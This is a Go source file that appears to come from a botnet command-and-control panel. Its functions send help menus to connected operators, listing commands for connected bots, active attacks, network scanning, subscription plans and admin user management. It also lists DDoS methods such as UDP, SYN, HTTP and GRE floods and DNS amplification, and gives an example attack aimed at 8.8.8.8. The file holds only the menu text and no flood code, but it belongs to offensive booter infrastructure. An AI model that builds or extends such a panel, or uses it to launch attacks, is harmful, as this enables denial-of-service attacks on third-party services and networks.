package handlers

import (
	"fmt"
	"net"
)

// ShowHelp displays the help menu
func ShowHelp(conn net.Conn) {
	helpText := `
╔══════════════════════════════════════════════════════════════╗
║                        help screen                           ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  help     - Shows this menu                                  ║
║  bots     - List all connected bots                          ║
║  attacks  - Show active attacks                              ║
║  methods  - List attack methods                              ║
║  scan     - Scan a network range                             ║
║  clear    - Clear the screen                                 ║
║  logout   - Disconnect from C2                               ║
║  plan     - Show your subscription plan                      ║
║  owner    - Show owner info                                  ║
║                                                              ║
║  !users   - List all users (admin only)                      ║
║  !add     - Add user (admin only)                            ║
║  !remove  - Remove user (admin only)                         ║
║  !ban     - Ban user (admin only)                            ║
║  !unban   - Unban user (admin only)                          ║
║                                                              ║
----------------------------------------------------------------
`
	conn.Write([]byte(helpText))
}

// ShowShortHelp displays a compact help menu
func ShowShortHelp(conn net.Conn) {
	conn.Write([]byte("\nCommands: help, bots, attacks, methods, scan, clear, logout, plan, owner\n"))
	conn.Write([]byte("Admin: !users, !add, !remove, !ban, !unban\n"))
	conn.Write([]byte("Attack: <method> <target> <port> <duration> <threads>\n\n"))
}

// ShowMethodsHelp displays method descriptions
func ShowMethodsHelp(conn net.Conn) {
	conn.Write([]byte("\n"))
	conn.Write([]byte("udp       - UDP bypass flood\n"))
	conn.Write([]byte("tcp       - TCP bypass flood\n"))
	conn.Write([]byte("syn       - SYN flood\n"))
	conn.Write([]byte("httpget   - HTTP GET flood\n"))
	conn.Write([]byte("httppost  - HTTP POST flood\n"))
	conn.Write([]byte("gre       - GRE/IPIP flood\n"))
	conn.Write([]byte("dns       - DNS amplification\n"))
	conn.Write([]byte("hold      - Connection hold\n"))
	conn.Write([]byte("mix       - Mixed attack\n"))
	conn.Write([]byte("\n"))
}

// ShowAttackFormat displays attack format
func ShowAttackFormat(conn net.Conn) {
	conn.Write([]byte("\n"))
	conn.Write([]byte("Attack format: <method> <target> <port> <duration> <threads>\n"))
	conn.Write([]byte("Example: udp 8.8.8.8 53 60 100\n"))
	conn.Write([]byte("\n"))
}

// ShowError displays error message
func ShowError(conn net.Conn, msg string) {
	conn.Write([]byte(fmt.Sprintf("\n[!] %s\n\n", msg)))
}

// ShowSuccess displays success message
func ShowSuccess(conn net.Conn, msg string) {
	conn.Write([]byte(fmt.Sprintf("\n[+] %s\n\n", msg)))
}

// ShowInfo displays info message
func ShowInfo(conn net.Conn, msg string) {
	conn.Write([]byte(fmt.Sprintf("\n[*] %s\n\n", msg)))
}